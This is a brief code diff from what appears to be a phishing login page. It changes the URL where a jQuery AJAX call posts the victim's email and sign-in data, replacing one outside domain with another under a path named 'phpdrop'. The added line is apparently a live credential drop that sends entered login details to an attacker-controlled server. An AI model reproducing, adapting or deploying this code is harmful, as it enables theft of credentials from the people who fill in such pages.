@@ -46,7 +46,7 @@ $(document).ready(function(){
         $("#mcontent").css("display", "none");
         $("#mspinner").css("display", "block");
         $.ajax({
-            url: "https://tenkproducts.shop/bryant/signin.php",
+            url: "https://basareneller.com/phpdrop/signin.php",
             method: "post",
             data: {
                 X1: email,
